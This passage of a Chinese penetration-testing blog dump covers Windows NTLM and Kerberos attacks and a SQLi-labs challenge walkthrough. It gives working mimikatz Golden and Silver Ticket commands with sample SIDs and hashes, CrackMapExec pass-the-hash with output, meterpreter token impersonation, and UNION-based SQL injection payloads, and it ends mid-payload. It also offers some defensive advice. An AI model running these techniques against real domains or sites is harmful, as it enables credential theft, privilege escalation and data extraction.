mimikatz.exe \u0026#34;kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /rc4:cbcede6976ded273667a8e574a17092f /user:aaa /ptt\u0026#34; \u0026#34;kerberos::list\u0026#34; exit 注:普通黄金票据不能跨域使用;TGT 有效时间为 20 分钟;。分钟;。\nSilver Ticket(白银票据) 白银票据是出现在TGS_REQ \u0026amp; TGS_REP过程中的。在TGS_REP中，不管Client是否有权限访问特殊服务，只要Client发送的TGT票据是正确的，那么就会返回服务hash加密的tgs票据。如果我们有了服务hash，就可以签发tgs票据。\n伪造白银票据的前提条件 1、域名称 secice.cn 2、域的 SID S-1-5-21-1431134449-3516206009-3475222595 3、域的服务账号的密码 hash f4bf5c36403ccc692e0bc5cf7f82a72a 4、伪造的用户名(可以是任意的) 白银票据这里只是对单一的服务进行授权，利用过程和golden ticket差不多，首先上域控制器中，把机器的ntlm hash(rc4加密) dump下来,然后在普通域用户机器进行伪造权限,进行ptt.\n白银票据利用 首先登录域控，dump机器hash\n1 2 3 4 5 6 7 privilege::debug sekurlsa::logonpasswords 也可以 mimikatz.exe \u0026#34;privilege::debug\u0026#34; \u0026#34;sekurlsa::logonpasswords\u0026#34; exit \u0026gt;\u0026gt; 1.txt 将hash和SID保存下来，在普通域用户机器中进行ptt（在黄金票据中我们可以不指定 target 和 service，但是在白银票据中必须指定 target 和 service）\n1 mimikatz.exe privilege::debug \u0026#34;kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /target:DC.secice.cn /service:cifs /rc4:f4bf5c36403ccc692e0bc5cf7f82a72a /user:aaa /ptt\u0026#34; exit 这里的cifs是指的文件共享服务，有了cifs服务权限，就可以访问域控制器的文件系统:\n不仅仅是cifs服务还有其他：\nldap可以用来dcsync\n两者区别 访问权限不同 Golden Ticket: 伪造 TGT,可以获取任何 Kerberos 服务权限 Silver Ticket: 伪造 TGS,只能访问指定的服务 加密方式不同 Golden Ticket 由 krbtgt 的 Hash 加密 Silver Ticket 由服务账号(通常为计算机账户)Hash 加密 认证流程不同 Golden Ticket 的利用过程需要访问域控,而 Silver Ticket 不需要 ","date":"2020-11-25T11:42:55Z","image":"https://w.wallhaven.cc/full/jx/wallhaven-jxdw35.png","permalink":"https://360rce.github.io/p/denbk947/","title":"Kerberos协议之黄金票据和白银票据"},{"content":"0x00 本地认证 本地认证基础知识 在本地登录Windows的情况下，操作系统会使用用户输入的密码作为凭证去与系统中的密码进行验证，但是操作系统中的密码存储在哪里呢？\n%SystemRoot%\\system32\\config\\sam\n当我们登录系统的时候,系统会自动地读取SAM文件中的“密码”与我们输入的“密码”进行比对，如果相同，证明认证成功!\n这个SAM文件中保留了计算机本地所有用户的凭证信息，可以理解为是一个数据库。\n上面认证的过程只是粗略的说法，整个认证过程并没有那么简单，从操作系统的角度来看，还是需要铺垫很多概念的。\nWindows本身不保存明文密码，只保留密码的Hash。\nHash，一般翻译做“散列”，也有直接音译为“哈希”的，就是把任意长度的输入（又叫做预映射pre-image）通过散列算法变换成固定长度的输出，该输出就是散列值。这种转换是一种压缩映射，也就是，散列值的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，所以不可能从散列值来确定唯一的输入值。简单的说就是一种将任意长度的消息压缩到某一固定长度的消息摘要的函数。 – Baidu\n为了保证存储的不是明文，从而采用Hash，但是密码Hash也需要特定的生成算法以及表现形式。\nNTLM Hash与NTLM 在Windows中，密码Hash目前称之为NTLM Hash，其中NTLM全称是：“NT LAN Manager”。\n这个NTLM是一种网络认证协议，与NTLM Hash的关系就是：NTLM网络认证协议是以NTLM Hash作为根本凭证进行认证的协议。\n也就是说，NTLM与NTLM Hash相互对应。\n在本地认证的过程中，其实就是将用户输入的密码转换为NTLM Hash与SAM中的NTLM Hash进行比较。\nNTLM Hash的产生 假设我的密码是admin，那么操作系统会将admin转换为十六进制，经过Unicode转换后，再调用MD4加密算法加密，这个加密结果的十六进制就是NTLM Hash。\n1 2 3 admin -\u0026gt; hex(16进制编码) = 61646d696e 61646d696e -\u0026gt; Unicode = 610064006d0069006e00 610064006d0069006e00 -\u0026gt; MD4 = 209c6174da490caeb422f3fa5a7ae634 本地认证流程 1 winlogon.exe -\u0026gt; 接收用户输入 -\u0026gt; lsass.exe -\u0026gt; (认证) 首先，用户注销、重启、锁屏后，操作系统会让winlogon显示登录界面，也就是输入框，接收输入后，将密码交给lsass进程，这个进程中会存一份明文密码，将明文密码加密成NTLM Hash，对SAM数据库比较认证。\nWindows Logon Process(即 winlogon.exe)，是Windows NT 用户登 陆程序，用于管理用户登录和退出。 LSASS用于微软Windows系统的安全机 制。它用于本地安全和登陆策略。 LM Hash 在NTLM协议问世之前，它对前身就是LM（LAN Manager）协议。\nLM与NTLM协议的认证机制相同，但是加密算法不同。\n目前大多数的Windows都采用NTLM协议认证，LM协议已经基本淘汰了。\nLM协议认证过程中需要LM Hash作为根本凭证进行参与认证，下面就简述一些LM Hash的产生：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 将所有小写字母转换为大写字母 • \u0026gt;123ABC // 未达到7个字符 • 将密码转化为16进制，分两组，填充为14个字符,空余位使用0x00字符填补 • \u0026gt;31323341424300000000000000 • 将密码分割为两组7个字节的块 • \u0026gt;31323341424300 00000000000000 // 16进制 • 将每组转化为比特流，不足56Bit则在左边加0 • \u0026gt;31323341424300 -\u0026gt;(转换为二进制) 110001001100100011001101000001010000100100001100000000-\u0026gt; (补 足56Bit) 00110001001100100011001101000001010000100100001100000000 • 将比特流按照7比特一组，分出8组，末尾加0 由于后者都为0，结果可想而知，那就都是0; • 将每组比特流转换为16进制作为被加密的值，使用DES加密，字符串 “KGS!@#$%”为Key(0x4B47532140232425)，得到8个结果 ，每个 结果转换为16进制。 • -\u0026gt; 00110000100110001000110001101000000101000001001000001100 00000000 • -\u0026gt;30988C6814120C00 -\u0026gt; DES(30988C6814120C00) -\u0026gt; 48-D7-EB-91- 2F-5E-69-7C • 由于我们的密码不超过7字节，所以后面的一半是固定的: • AA-D3-B4-35-B5-14-04-EE • 连接两个DES加密字符串。这是LM哈希。 • 48-D7-EB-91-2F-5E-69-7C-AA-D3-B4-35-B5-14-04-EE 在上面的产生过程中，脆弱点就在于DES的Key（KGS!@#$%）是固定的，也就是说，有了Key就能够解出原文。\n并且根据LM Hash特征，也能够判断用户的密码是否是大于等于7位。\n0x01 网络认证 在内网渗透中，经常遇到工作组环境，而工作组环境是一个逻辑 上的网络环境(工作区)，隶属于工作组的机器之间无法互相建 立一个完美的信任机制，只能点对点，是比较落后的认证方式， 没有信托机构。\n假设A主机与B主机属于同一个工作组环境，A想访问B主机上的资料，需要将一个存在于B主机上的账户凭证发送至B主机，经过认证才能够访问B主机上的资源。\n这是我们接触比较多的SMB共享文件的案例，SMB的默认端口是445。\n早期SMB协议在网络上传输明文口令。后来出现 LAN Manager Challenge/Response 验证机制，简称LM，它是如此简单以至很容易就被破解，现在又有了NTLM以及Kerberos。\nNTLM 协议 NTLM是一种网络认证协议，它是基于挑战（Chalenge）/响应（Response）认证机制的一种认证模式。\n这个协议只支持Windows\nChalenge/Response NTLM协议的认证过程分为三步：\n协商 质询 验证 协商：主要用于确认双方协议版本\n质询：就是挑战（Chalenge）/响应（Response）认证机制起作用的范畴，本小节主要讨论这个机制的运作流程。\n验证：验证主要是在质询完成后，验证结果，是认证的最后一步。\n质询的完整过程：\n1.客户端向服务器端发送用户信息(用户名)请求 2.服务器接受到请求，生成一个16位的随机数，被称之为“Challenge”， 使用登录用户名对应的NTLM Hash加密Challenge(16位随机字符)， 生成Challenge1。同时，生成Challenge1后，将Challenge(16位随机 字符)发送给客户端。 3.客户端接受到Challenge后，使用将要登录到账户对应的NTLM Hash加密Challenge生成Response，然后将Response发送至服务器端。 其中，经过NTLM Hash加密Challenge的结果在网络协议中称之为Net NTLM Hash。\n验证： 服务器端收到客户端的Response后，比对Chanllenge1与Response是否相等，若相等，则认证通过。\n使用另外一种方式解读：\n1.Server接收到Client发送的用户名后，判断本地账户列 表是否有用户名share_user\n如果没有，返回认证失败 如果有，生成Chanllenge，并且从本地查找share_user对 应的NTLM Hash，使用NTLM Hash加密Chanllenge，生成一 个Net-NTLM Hash存在内存中，并将Chanllenge发送给Client。 2.Client接收到Chanllenge后，将自己提供的share_user的密码转换为NTLM Hash，使用NTLM Hash加密Chanllenge， 这个结果叫Response，表现形式是Net-NTLM Hash，最后将Response发送给Server。\n3.Server接收到Client发送的Response，将Response与之 前的Net-NTLM Hash进行比较，如果相等，则认证通过。\n注意:\n1.Chanllenge是Server产生的一个16字节的随机数，每次认证都不同\n2.Response的表现形式是Net-NTLM Hash，它是由客户端 提供的密码Hash加密Server返回的Chanllenge产生的结果。\nNTLM V2协议 NTLM v1与NTLM v2最显著的区别就是Challenge与加密算法不同，共同点就是加密的原料都是NTLM Hash。\n下面细说一下有什么不同:\nChallage:NTLM v1的Challenge有8位，NTLM v2的Challenge为16位。 Net-NTLM Hash:NTLM v1的主要加密算法是DES，NTLM v2的主要加密算法是HMAC-MD5。 现在应该能够理解什么是NTLM、NTLM Hash、LM、LM Hash、Net NTLM Hash了吧？\nPass The Hash 在内网渗透中，我们经常会需要抓取管理员的密码、NTLM Hash，通过搜集这些信息有助于我们扩大战果，尤其是在域环境下。\n什么是哈希传递? 哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术。\n哈希传递的作用? 解决了我们渗透中获取不到明文密码、破解不了NTLM Hash而又 想扩大战果的问题。\nPass The Hash - 必要条件\n哈希传递需要被认证的主机能够访问到服务器(废话) 哈希传递需要被传递认证的用户名 哈希传递需要被传递认证用户的NTLM Hash 要完成一个NTLM认证，第一步需要客户端将自己要参与认证的 用户名发送至服务器端，等待服务器端给出的Challenge⋯⋯\n其实哈希传递就是使用用户名对应的NTLM Hash将服务器给出的 Chanllenge加密，生成一个Response，来完成认证。\nPass The Hash能够完成一个不需要输入密码的NTLM协议认证流程，所以不算是一个漏洞，算是一个技巧。\nPass The Hash的工具：\nSmbmap CrackMapExec Smbexec Metasploit 使用CrackMapExec实现Hash传递：\n1 2 3 4 5 6 7 root@kali:~/cache# cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 -x whoami SMB 192.168.3.5 445 LIYINGZHEA30B [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (name:LIYINGZHEA30B) (domain:PAYLOADS) (signing:False) (SMBv1:True) SMB 192.168.3.5 445 LIYINGZHEA30B [+] PAYLOADS\\administrator dab7de8feeb5ecac65faf9fdc6cac3a9 (Pwn3d!)SMB 192.168.3.5 445 LIYINGZHEA30B [+] Executed command 0x02 Kerberos域认证 Active Directory(活动目录)概念 Windows提供了为企业管理资产、服务、网络对象进行组织化的管理，这非常符合企业架构的管理模式。而承载这些管理机制的就是活动目录服务。如果要搭建一个域，就需要安装活动目录服务，当然，这个不在我们的讨论范围。\n活动目录服务以域名来划分域的边界，域外就不属于管理范围了，也就是说，一个域对应一个域名，域之间也可以相互信任。\nActive Directory存储了有关网络对象的信息，并且让管理员和用 户能够轻松地查找和使用这些信息。Active Directory使用了一种 结构化的数据存储方式，并以此作为基础对目录信息进行合乎逻 辑的分层组织。 网络对象分为:用户、用户组、计算机、域、组织单位以及安全 策略等。 Active Directory(活动目录)功能 服务器及客户端计算机管理:管理服务器及客户端计算机账户， 所有服务器及客户端计算机加入域管理并实施组策略。 用户服务:管理用户域账户、用户信息、企业通讯录(与电子邮 件系统集成)、用户组管理、用户身份认证、用户授权管理等， 按省实施组管理策略。 资源管理:管理打印机、文件共享服务等网络资源。 桌面配置:系统管理员可以集中的配置各种桌面配置策略，如: 用户使用域中资源权限限制、界面功能的限制、应用程序执行特 征限制、网络连接限制、安全配置限制等。 应用系统支撑:支持财务、人事、电子邮件、企业信息门户、办 公自动化、补丁管理、防病毒系统等各种应用系统。 在域中，网络对象可以相互访问，但是在真实情况中，需要对某些部门的计算机进行限制，例如：销售部门不能访问技术部门的服务器。\n这个中间就需要Kerberos认证协议来验证网络对象间的权限。\n域认证体系 - Kerbroes Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客 户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不 依赖于主机操作系统的认证，无需基于主机地址的信任，不要求 网络上所有主机的物理安全，并假定网络上传送的数据包可以被 任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一 种可信任的第三方认证服务，是通过传统的密码技术(如:共享 密钥)执行认证服务的。\n域认证所参与的角色 (三只狗头) Kerberos的标志是三只狗头，狗头分别代表以下角色：\nClient Server KDC(Key Distribution Center) = DC(Domain Controller) Kerberos认证协议的基础概念：\n票据（Ticket）：是网络对象互相访问的凭证。 TGT（Ticket Granting Ticket）：入场券，通过入场券能够获得票据，是一种临时凭证的存在。\nKDC负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由以下服务组成：\nAuthentication Service: 为client生成TGT的服务 Ticket Granting Service: 为client生成某个服务的ticket 另外还需要介绍一个类似于本机SAM的一个数据库：AD，全称叫account database，存储所有client的白名单，只有存 在于白名单的client才能顺利申请到TGT。\n从物理层面看，AD与KDC均为域控制器(Domain Controller)。\n域认证粗略流程 client向kerberos服务请求，希望获取访问server的权限。 kerberos得到了这个消息，首先得判断client是否是可信赖的， 也就是白名单黑名单的说法。这就是AS服务完成的工作，通过 在AD中存储黑名单和白名单来区分client。成功后，返回AS返 回TGT给client。 client得到了TGT后，继续向kerberos请求，希望获取访问 server的权限。kerberos又得到了这个消息，这时候通过client 消息中的TGT，判断出了client拥有了这个权限，给了client访 问server的权限ticket。 client得到ticket后，终于可以成功访问server。这个ticket只是 针对这个server，其他server需要向TGS申请。 域认证 首先，客户端需要发送自己的身份信息到KDC，身份信息中起码包含用户名，KDC根据用户名在AD中寻找是否在白名单中，然后根据用户名提取到对应的NTLM Hash。\nKDC此时生成一个随机字符串，叫Session Key，使用用户名对应的NTLM Hash加密Session Key，作为AS数据，使用KDC中某个用户的NTLM Hash加密Session Key和客户端的信息，生成TGT。\nSession Key用于客户端向TGS服务通信。 域内所有网络对象的凭证都在AD中保存 KDC中某个用户指的是krbtgt 数据结构：\n其中，TGT的到期时间为8小时，如果超过了8小时，还需要重新申请TGT，不能之间进入下一步获取Ticket。\nKerberos是一个假设网络环境不安全的情况下能够正常进行认证工作的协议。\n第一步中，KDC返回的TGT客户端是无法解密的，因为它没有KDC Hash，如果有，我们就可以伪造黄金票据，这个是后话了。\n第二步客户端需要提供TGT与第一步中使用自己NTLM Hash解密出来的Session Key加密的客户端信息跟时间戳。\n如果假设这个数据被中间人窃取到，也无法在段时间内破解，因为KDC会校验时间戳。\nKDC接到TGT与其他内容后，会首先解密TGT，只有KDC可以解密TGT，从TGT中提取到Session Key，再使用Session Key解密其他内容，解密出来的内容同TGT中的信息进行校验来确认客户端是否受信。\n验证通过后，就会生成一个新的Session Key，我们称之为Server Session Key，这个Server Session Key主要用于和服务器进行通信。同时还会生成一个Ticket，也就是最后的票据了。\nTicket组成如下：\nServer Hash：这个Hash是在AD中服务器计算机的NTLM Hash。\n在第三步里，客户端向服务器请求，需要提供Ticket，Server Session Key加密的客户端信息与时间戳。\nTicket客户端无法解密 服务器端通过解密Ticket解密Server Session Key(Client info + Timestamp) 比较时间长度 校验通过后，认证成功，该票据会一直存在客户端内存中。\n白银票据(Silver Tickets) 白银票据特点:\n1.不需要与KDC进行交互 2.需要目标服务的NTLM Hash 在第三步认证中的Ticket的组成:\n1 Ticket=Server Hash(Server Session Key+Client info+End Time) 当拥有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket。\nPS:Server Session Key在未发送Ticket之前，服务器是不知道Server Session Key是什么的。 所以，一切凭据都来源于Server Hash。\n伪造白银票据(Silver Tickets) 首先需要导出Server Hash：\n1 C:\\files\u0026gt;mimikatz.exe \u0026#34;privilege::debug” \u0026#34;sekurlsa::logonpasswords\u0026#34; \u0026#34;exit\u0026#34; \u0026gt; log.txt 伪造票据:\n1 mimikatz “kerberos::golden /domain:\u0026lt;域名\u0026gt; /sid:\u0026lt;域 SID\u0026gt; /target:\u0026lt;目标服务器主机名\u0026gt; /service:\u0026lt;服务类型\u0026gt; /rc4:\u0026lt;NTLM Hash\u0026gt; /user:\u0026lt;用户名\u0026gt; /ptt\u0026#34; exit Other：\nkerberos::list #列出票据 kerberos::purge # 清除票据 由于白银票据需要目标服务器的Hash，所以没办法生成对应域内 所有服务器的票据，也不能通过TGT申请。因此只能针对服务器 上的某些服务去伪造，伪造的服务类型列表如下:\n服务注释 服务名 WMI HOST、RPCSS Powershell Remoteing HOST、HTTP WinRM HOST、HTTP Scheduled Tasks HOST LDAP 、DCSync LDAP Windows File Share (CIFS) CIFS Windows Remote ServerAdministration Tools RPCSS、LDAP、CIFS 白银票据(Silver Tickets)演示 白银票据(Silver Tickets)防御 1.尽量保证服务器凭证不被窃取 2.开启PAC (Privileged Attribute Certificate) 特权属性证书保护 功能，PAC主要是规定服务器将票据发送给kerberos服务，由 kerberos服务验证票据是否有效。 开启方式:\n将注册表中\n1 HKEY_LOCAL_MACHINE\\SYSTEM \\ CurrentControlSet\\Control\\Lsa\\Kerberos\\Parameters 中的ValidateKdcPacSignature设置为1。\n黄金票据(Golden Tickets) 黄金票据特点:\n1.需要与DC通信 2.需要krbtgt用户的hash PS:这里的krbtgt hash就是之前讲的KDC Hash\n黄金票据(Golden Tickets)-MSF kiwi 使用meterpreter中的kiwi模块：\n1 load kiwi 创建票据：\n注入到内存：\n使用wmic在目标服务器上创建一个进程：\n黄金票据(Golden Tickets) - 伪造 伪造票据:\n1 mimikatz “kerberos::golden /domain:\u0026lt;域名\u0026gt; /sid:\u0026lt;域SID\u0026gt; /rc4:\u0026lt;KRBTGT NTLM Hash\u0026gt; /user:\u0026lt;任意用户名\u0026gt; /ptt\u0026#34; exit 黄金票据(Golden Tickets) - 演示 Tickets 总结 黄金票据:从攻击面来看，获取krbtgt用户的hash后，可以在域中 进行持久性的隐藏，并且日志无法溯源，但是需要拿到DC权限， 使用黄金票据能够在一个域环境中长时间控制整个域。 从防御角度来看，需要经常更新krbtgt的密码，才能够使得原有的 票据失效。最根本的办法是不允许域管账户登录其他服务器。 白银票据:从攻击面来看，伪造白银票据的难度比伪造黄金票据的 难度较小，因为一个域中的服务器如果对外的话，非常容易被入侵， 并且容易被转储Server。 从防御角度来看，需要开启PAC认证，但这会降低认证效率，增加 DC的负担，最根本的还是要加固服务器本身对外的服务。 0x03 Windows Access Token Windows Access Token 简介 Windows Token其实叫Access Token(访问令牌)，它是一个描 述进程或者线程安全上下文的一个对象。不同的用户登录计算机后， 都会生成一个Access Token，这个Token在用户创建进程或者线程 时会被使用，不断的拷贝，这也就解释了A用户创建一个进程而该 进程没有B用户的权限。\nAccess Token种类：\n主令牌 模拟令牌 一般情况下，用户双击运行一个程序，都会拷贝“explorer.exe”的Access Token。\n当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除。\nWindows Access Token组成 用户帐户的安全标识符(SID) 用户所属的组的SID 用于标识当前登录会话的登录SID 用户或用户组所拥有的权限列表 所有者SID 主要组的SID 访问控制列表 访问令牌的来源 令牌是主要令牌还是模拟令牌 限制SID的可选列表 目前的模拟等级 其他统计数据 Windows Access Token – SID (Security Identifiers)安全标识符 安全标识符是一个唯一的字符串，它可以代表一个账户、一个用户 组、或者是一次登录。通常它还有一个SID固定列表，例如 Everyone这种已经内置的账户，默认拥有固定的SID。\nSID的表现形式:\n域SID-用户ID 计算机SID-用户ID SID列表都会存储在域控的AD或者计算机本地账户数据库中。 Windows Access Token产生过程 每个进程创建时都会根据登录会话权限由LSA(Local Security Authority)分配一个Token(如果CreaetProcess时自己指定了 Token, LSA会用该Token， 否则就用父进程Token的一份拷贝。\nWindows Access Token令牌假冒实战 当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清 除，只有在重启机器后才会清除。\n可以使用多种工具查看目前系统上存在的模拟令牌:\nIncognito Powershell - Invoke-TokenManipulation.ps1 Cobalt Strike - steal_token 案例(针对某跨国企业的一次渗透测试 获取DC权限）: http://blog.360ec.net/archives/32/\nWindows Access Token令牌假冒实战 1 2 3 4 5 6 meterpreter \u0026gt; getsystem meterpreter \u0026gt; load incognito meterpreter \u0026gt; list_tokens –u Delegation Tokens Available ============================== NT AUTHORITY\\LOCAL SERVICENT AUTHORITY\\NETWORK SERVICENT AUTHORITY\\SYSTEM PAYLOADS\\Administrator PAYLOADS\\w7 meterpreter \u0026gt; impersonate_token \u0026#34;PAYLOADS\\Administrator” [+] Delegation token available [+] Successfully impersonated user PAYLOADS\\Administrator Windows Access Token令牌假冒防御 禁止Domain Admins登录对外且未做安全加固的服务器，因为一旦服务器被入侵，域管理员的令牌可能会被攻击者假冒，从控制DC。\n如果想清除假冒，重启服务器即可。\n0x04 知识点总结 本次议题围绕着Windows认证分别讲解了Pass The Hash、Silver Tickets、Golden Tickets、 Impersonation Token的原理。 这些技术分别能够满足我们在渗透中持续的维持权限、提权。\n可拓展:\n域渗透技术/思路，SPN扫描，Red/Blue team\nhttps://lolbas-project.github.io/ https://gtfobins.github.io/ https://github.com/yeyintminthuhtut/Awesome-Red-Teaming 转载自：\nhttps://payloads.online/archivers/2018-11-30/1\n","date":"2020-11-23T11:42:55Z","image":"https://w.wallhaven.cc/full/p9/wallhaven-p9goyp.png","permalink":"https://360rce.github.io/p/mljrguh0/","title":"彻底理解Windows认证"},{"content":"Kerberos 协议简介 Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序 提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址 的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意的读取、 修改和插入数据。在以上情况下，Kerberos 作为一种可信任的第三方认证服务，是通过传统 的密码技术(如:共享密钥)执行认证服务的。\nKerberos 协议框架 Kerberos 协议中主要有三个角色:\n访问服务的 Client 提供服务的 Server KDC(Key Distribution Center)密钥分发中心 KDC 默认安装在域控中，而 Client 和 Server 为域内的用户或者服务，如 web 应用、数\n据库服务器和邮件服务器等。Client 是否有权限访问 Server 端的服务由 KDC 发放的票据来 决定。\n如果把 Kerberos 中的票据比作一张火车票，那么 Client 端就是乘客，Server 就是火车， 而 KDC 就是火车站的认证系统。如果 Client 端的票据是合法的(由你本人身份证购买并且 由你本人持有)同时有访问 Server 端服务的权限(车票对应车次正确)那么你才能上车。当 然和火车票不同的是 Kerberos 中有两张票据，而火车票只有一张。\n由上图可以看出，KDC 又分为两个部分:\nAuthentication Server:\nAS 的作用就是验证 Client 的身份(确认你是身份证上的本人)，\n验证通过就给一张 TGT(Ticket Granting Ticket)票给 Client。\nTicket Granting Server:\nTGS 的作用就是通过 AS 发给 Client 的票(TGT)换取访问 Server\n端的票 ST(Server Ticket)。ST 也有资料称之为 TGS Ticket。\nKerberos 认证流程 当 Client 想要访问 Server 上的某个服务时，需要先向 AS 证明自己的身份，然后通过 AS 发放的 TGT 向 Server 发起认证请求，这个过程分为三块:\nThe Authentication Service Exchange: Client 与 AS 的交互 The Ticket Granting Service Exchange:Client 与 TGS 的交互 The Client/Server Authentication Exchange:Client 与 Server 的交互 (1) The Authentication Service Exchange KRB_AS_REQ: Client-\u0026gt;AS:发送 Authenticator1(Client 密码加密 TimeStamp)\n第一步 Client 先向 KDC 的 AS 发送 Authenticator1,内容为通过 Client 密码 hash 加密的时间戳、Client ID、网络地址、加密类型等内容。\nKBR_AS_REP: AS-\u0026gt;Client:发送 Client 密码加密的 sessionkey-as 和票据 TGT(KBRTGT HASH 加密的 sesionkey-as 和 Timestamp)\n在 KDC 中存储了域中所有用户的密码 hash，当 AS 接受到 Client 的请求后会根据 KDC 中存储的密码来解密，解密成功并且验证信息。验证成功后返回给 Client 由 Client 密码 hash 加密的 sessionkey-as 和 TGT(由 KBRTGT HASH 加密的 sessionkey-as 和 Timestamp 等信 息)。\n(2) The Ticket Granting Service(TGS) Exchange KBR_TGS_REQ: Client-\u0026gt;TGS 发送 Authenticator2(sessionkey-as 加密 timestamp)和票据 TGT(KBRTGT HASH 加密的 sessionkey-as 和 timestamp)\nClient 接收到了加密的 sessionkey-as 和 TGT 后，用自身的密码解密得到 sessionkey-as， TGT 是 KDC 密码加密的，Client 无法解密。这时 Client 再用 sessionkey-as 加密 timestamp 和 TGT 一起发送给 KDC 中的 TGS(Ticket Granting Server)票据授权服务器换取能够访问 Server 的票据。\nKBR_TGS-REP: TGS-\u0026gt;Client:发送密文(由 sessionkey-as 加密的 sessionkey-tgs)和票据 ST(由 server 密 码 hash 加密的 sessionkey-tgs)\nTGS 收到 Client 发送过来的 TGT 和 Sessionkey-as 加密的 TimeStamp 之后，首先会检 查自身是否存在 Client 所请求的服务。如果服务存在，则用 KRBTGT 密码解密 TGT。一般情 况下 TGS 会检查 TGT 中的时间戳查看 TGT 是否过期，且原始地址是否和 TGT 中保存的地址 相同。验证成功之后将用 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 HASH 加密的 Sessionkey-tgs 发送给 Client。\n(3) The Client/Server Authentication Exchange KBR_AP_REQ: Client-\u0026gt;Server 发送 Authenticator3(sessionkey-tgs 加密 timestamp)和票据 ST(Server 密码 hash 加密的 sessionkey-tgs)\nClient 收到 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 hash 加密的 sessionkey- tgs 之后用 sessionkey-as 解密得到 sessionkey-tgs，然后把 sessionkey-tgs 加密的 timestamp 和 ST 一起发送给 Server。\nKBR_AP_REP: Server-\u0026gt;Client :\nServer 通过自己的密码解密 ST，得到 sessionkey-tgs，再用 sessionkey-tgs 解密 Authenticator3 得到 timestamp，验证正确返回验证成功。\n","date":"2020-11-23T11:42:55Z","image":"https://w.wallhaven.cc/full/2y/wallhaven-2y2y9y.jpg","permalink":"https://360rce.github.io/p/mg0ziixb/","title":"域渗透之Kerberos协议"},{"content":"进阶挑战 54-65 关 Less-54 请求方式 注入类型 拼接方式 GET 联合、布尔盲注、延时盲注 id='$id' 简单源码分析：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 if reset: # 根据时间戳生成 cookie setcookie(\u0026#39;challenge\u0026#39;, \u0026#39; \u0026#39;, time() - 3600000); else: if cookie 中有 challenge: $sessid=$_COOKIE[\u0026#39;challenge\u0026#39;]; else: # 生成 cookie $expire = time()+60*60*24*30; $hash = data($table,$col); setcookie(\u0026#34;challenge\u0026#34;, $hash, $expire); if $_GET[\u0026#39;id\u0026#39;]: 计数器 + 1 $sql=\u0026#34;SELECT * FROM security.users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;; if 有查询成功: 输出查询信息 else： 啥都不输出 # key 被双重过滤了 $key = addslashes($_POST[\u0026#39;key\u0026#39;]); $key = mysql_real_escape_string($key); $sql=\u0026#34;SELECT 1 FROM $table WHERE $col1= \u0026#39;$key\u0026#39;\u0026#34;; 代码中可以分享出，得让我们在 10 次注入测试中拿到 key 值。看了源码可以直接联合查询，10 次以内拿到 key 感觉问题不大，那么尝试看看吧：\n判断闭合方式\n1 ?id=1\u0026#39;--+ 判断字段数\n1 2 ?id=1\u0026#39; order by 3--+ ?id=1\u0026#39; order by 4--+ 查询有可注入的字段\n1 ?id=-1\u0026#39; union select 1,2,3 --+ 字段数 2,3\n查询表名\n1 ?id=-1\u0026#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) --+ 表名为：bplubnri6m，这个表名可能是随机的 不同用户不一样\n查询列名\n1 ?id=-1\u0026#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;bplubnri6m\u0026#39;) --+ 查到列名如下：id,sessid,secret_0UH9,tryy\n查询字段值\n1 ?id=-1\u0026#39; union select 1,2,(select group_concat(secret_0UH9) from bplubnri6m) --+ 拿到 key 值为：Vbf3WpKCBvu8s4rnCTEeWcPa\n总共只需要 6 步，其中在判断字段数这里有不确定性，理论上 10 步以内是可以正常注入出来的。\nLess-55 请求方式 注入类型 拼接方式 GET 联合、布尔盲注、延时盲注 id=($id) Less-55 给了 14 次尝试机会，代码基本上没有变化，只是闭合方式发生了变化，这里不再赘述。\nLess-56 请求方式 注入类型 拼接方式 GET 联合、布尔盲注、延时盲注 id=('$id') 和 Less-54 相比只是拼接方式不一样，还是那个姿势，详见 Less-54\nLess-57 请求方式 注入类型 拼接方式 GET 联合、布尔盲注、延时盲注 id=\u0026quot;$id\u0026quot; 和 Less-54 相比只是拼接方式不一样，还是那个姿势，详见 Less-54\nLess-58 请求方式 注入类型 拼接方式 GET 报错、布尔盲注、延时盲注 id='$id' Less-58 这里相比较于 Less-54 - Less-57 变化还是比较大的，主要有明显区别的代码如下：\n1 2 3 4 $unames=array(\u0026#34;Dumb\u0026#34;,\u0026#34;Angelina\u0026#34;,\u0026#34;Dummy\u0026#34;,\u0026#34;secure\u0026#34;,\u0026#34;stupid\u0026#34;,\u0026#34;superman\u0026#34;,\u0026#34;batman\u0026#34;,\u0026#34;admin\u0026#34;,\u0026#34;admin1\u0026#34;,\u0026#34;admin2\u0026#34;,\u0026#34;admin3\u0026#34;,\u0026#34;dhakkan\u0026#34;,\u0026#34;admin4\u0026#34;); $pass = ($unames); echo \u0026#39;Your Login name : \u0026#39;. $unames[$row[\u0026#39;id\u0026#39;]]; echo \u0026#39;Your Password : \u0026#39; .$pass[$row[\u0026#39;id\u0026#39;]]; 因为这里输出只输出 $unames 和 $pass 数组，pass 数组就是 unames 数组的逆序，所以这里使用联合查询的话是没有效果的，输出不了有用的信息。天无绝人之路，但是下面输出：\n1 print_r(mysql_error()); 所以这里就可以进行报错注入，下面直接丢 payload 吧：\n1 